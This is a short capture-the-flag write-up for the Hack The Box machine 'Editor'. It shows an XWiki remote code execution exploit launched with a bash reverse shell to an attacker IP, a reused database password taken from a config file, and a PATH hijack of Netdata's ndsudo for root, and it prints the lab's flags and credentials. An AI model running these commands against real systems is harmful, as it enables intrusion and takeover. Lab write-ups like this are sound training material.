# Write-up: Editor HTB

![editor](https://www.hackthebox.com/storage/avatars/7d4a6dfe5b291cbe7b4e13e5f5c4d6c3.png)

**Difficulty:** Easy  
**Platform:** Hack The Box  
**Link:** [https://app.hackthebox.com/machines/Editor](https://app.hackthebox.com/machines/Editor)

## 🎯 Summary
Editor is an easy Linux machine that involves exploiting a Remote Code Execution (RCE) vulnerability in XWiki (CVE-2025-24893) for initial access, leveraging password reuse for horizontal privilege escalation, and abusing a SUID binary in Netdata (CVE-2024-32019) for root privileges.

## 📋 Table of Contents
1.  [Reconnaissance](#-reconnaissance)
2.  [Enumeration](#-enumeration)
3.  [Exploitation: Initial Foothold](#-exploitation-initial-foothold)
4.  [Privilege Escalation: User](#-privilege-escalation-to-user)
5.  [Privilege Escalation: Root](#-privilege-escalation-to-root)
6.  [Lessons Learned](#-lessons-learned)
7.  [References](#-references)

---

## 🔍 Reconnaissance

Started with a full port scan using `nmap`.

**Command:**
```bash
nmap -sC -sV -oA nmap/initial 10.10.11.80

    22/tcp - OpenSSH 8.9p1

    80/tcp - nginx 1.18.0

    8080/tcp - Jetty 10.0.28 (XWiki 15.10.8)

🚀 Exploitation

1. Initial Access (XWiki RCE):
bash

python3 exploit.py -t http://editor.htb:8080 -c 'bash -i >& /dev/tcp/10.10.14.179/4444 0>&1'

Gained shell as xwiki user.

2. User Flag:
Found credentials in /usr/lib/xwiki/WEB-INF/hibernate.cfg.xml:
xml

<property name="hibernate.connection.password">theEd1t0rTeam99</property>

SSH access as oliver:
bash

ssh oliver@editor.htb
User flag: bc2341152c638da4a05b91d91c1df26f

3. Root Access:
Exploited SUID binary:
bash

echo 'int main(){setuid(0);system("/bin/bash");}' > /tmp/nvme-list.c
gcc /tmp/nvme-list.c -o /tmp/nvme-list
export PATH=/tmp:$PATH
/opt/netdata/usr/libexec/netdata/plugins.d/ndsudo nvme-list

Root flag: 6d4d6c2368c3210994e624647c93119f
🔑 Credentials

    DB/XWiki: xwiki:theEd1t0rTeam99

    SSH: oliver:theEd1t0rTeam99

💡 Lessons Learned

    Patch management critical

    Password reuse is dangerous

    Audit SUID binaries regularly